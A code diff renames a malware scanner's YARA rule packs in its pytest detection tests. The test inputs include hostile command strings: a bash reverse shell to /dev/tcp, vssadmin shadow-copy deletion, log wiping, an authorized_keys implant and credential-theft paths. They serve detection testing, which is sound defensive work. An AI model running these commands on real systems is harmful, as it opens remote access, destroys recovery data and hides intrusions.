@@ -18,7 +18,7 @@ import pytest
 yara = pytest.importorskip("yara")
 
 _RULES_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)),
-                          "hawkscan", "rules")
+                          "hawk_malware_scan", "rules")
 
 
 def _rule_files():
@@ -44,7 +44,7 @@ def test_all_bundled_packs_compile_together():
 
 def test_stealers_pack_detects_and_no_fp():
     rules = yara.compile(
-        filepath=os.path.join(_RULES_DIR, "hawkscan_stealers.yar"))
+        filepath=os.path.join(_RULES_DIR, "hawk_malware_scan_stealers.yar"))
 
     def hit(data):
         return {m.rule for m in rules.match(data=data)}
@@ -52,19 +52,19 @@ def test_stealers_pack_detects_and_no_fp():
     # 0x5c = backslash; build the real named-pipe path unambiguously.
     bs = b"\x5c"
     pipe = bs + bs + b".\x5cpipe\x5cmsagent_7f3a"
-    assert "HawkScan_CobaltStrike_Beacon_Indicators" in hit(b"x " + pipe + b" y")
-    assert "HawkScan_CobaltStrike_Beacon_Indicators" in hit(
+    assert "HawkMalwareScan_CobaltStrike_Beacon_Indicators" in hit(b"x " + pipe + b" y")
+    assert "HawkMalwareScan_CobaltStrike_Beacon_Indicators" in hit(
         b"ReflectiveLoader ... beacon.dll")
-    assert "HawkScan_Infostealer_BrowserCredentialTheft" in hit(
+    assert "HawkMalwareScan_Infostealer_BrowserCredentialTheft" in hit(
         b"\x5cGoogle\x5cChrome\x5cUser Data Login Data Local State wallet.dat")
-    assert "HawkScan_Clipboard_CryptoClipper" in hit(
+    assert "HawkMalwareScan_Clipboard_CryptoClipper" in hit(
         b"OpenClipboard GetClipboardData SetClipboardData "
         b"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
-    assert "HawkScan_Shellcode_Loader_InjectionTriad" in hit(
+    assert "HawkMalwareScan_Shellcode_Loader_InjectionTriad" in hit(
         b"MZ\x90\x00 VirtualAllocEx WriteProcessMemory CreateRemoteThread")
-    assert "HawkScan_Keylogger_LogFormat" in hit(
+    assert "HawkMalwareScan_Keylogger_LogFormat" in hit(
         b"[ENTER][BACKSPACE][TAB] GetAsyncKeyState")
-    assert "HawkScan_DotNet_RAT_Markers" in hit(
+    assert "HawkMalwareScan_DotNet_RAT_Markers" in hit(
         b"AsyncClient Server Certificate DoProcessKill")
     # Benign prose must not match any stealer rule.
     assert hit(b"A normal note about chrome browsers and clipboards.") == set()
@@ -72,19 +72,19 @@ def test_stealers_pack_detects_and_no_fp():
 
 def test_ransomware_pack_detects_and_no_fp():
     rules = yara.compile(
-        filepath=os.path.join(_RULES_DIR, "hawkscan_ransomware.yar"))
+        filepath=os.path.join(_RULES_DIR, "hawk_malware_scan_ransomware.yar"))
 
     def hit(data):
         return {m.rule for m in rules.match(data=data)}
 
-    assert "HawkScan_Ransomware_RecoveryTampering" in hit(
+    assert "HawkMalwareScan_Ransomware_RecoveryTampering" in hit(
         b"cmd /c vssadmin delete shadows /all /quiet & bcdedit /set "
         b"recoveryenabled no")
-    assert "HawkScan_Ransomware_FamilyArtifacts" in hit(
+    assert "HawkMalwareScan_Ransomware_FamilyArtifacts" in hit(
         b"drop @WanaDecryptor@.exe and rename to .wncry")
-    assert "HawkScan_Ransomware_EncryptionBehavior" in hit(
+    assert "HawkMalwareScan_Ransomware_EncryptionBehavior" in hit(
         b"CryptGenKey FindFirstFile your files have been encrypted .onion")
-    assert "HawkScan_Cryptominer_StratumPool" in hit(
+    assert "HawkMalwareScan_Cryptominer_StratumPool" in hit(
         b"pool stratum+tcp://xmr.pool.example:3333 user wallet")
     # Benign prose must not match.
     assert hit(b"A guide to backups and file encryption best practices.") == set()
@@ -92,18 +92,18 @@ def test_ransomware_pack_detects_and_no_fp():
 
 def test_linux_threats_pack_detects_and_no_fp():
     rules = yara.compile(
-        filepath=os.path.join(_RULES_DIR, "hawkscan_linux_threats.yar"))
+        filepath=os.path.join(_RULES_DIR, "hawk_malware_scan_linux_threats.yar"))
 
     def hit(data):
         return {m.rule for m in rules.match(data=data)}
 
-    assert "HawkScan_Linux_Botnet_MiraiGafgyt" in hit(
+    assert "HawkMalwareScan_Linux_Botnet_MiraiGafgyt" in hit(
         b"\x7fELF junk TSource Engine Query more")
-    assert "HawkScan_Linux_ReverseShell" in hit(
+    assert "HawkMalwareScan_Linux_ReverseShell" in hit(
         b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
-    assert "HawkScan_Linux_AntiForensics_LogWipe" in hit(
+    assert "HawkMalwareScan_Linux_AntiForensics_LogWipe" in hit(
         b"unset HISTFILE; rm -f /var/log/wtmp /var/log/btmp")
-    assert "HawkScan_Linux_Persistence_Implant" in hit(
+    assert "HawkMalwareScan_Linux_Persistence_Implant" in hit(
         b"echo 'ssh-rsa AAAAB3Nz...' >> ~/.ssh/authorized_keys")
     # Benign admin/firmware text must not match.
     assert hit(b"This BusyBox firmware mounts /dev and starts the watchdog.") == set()
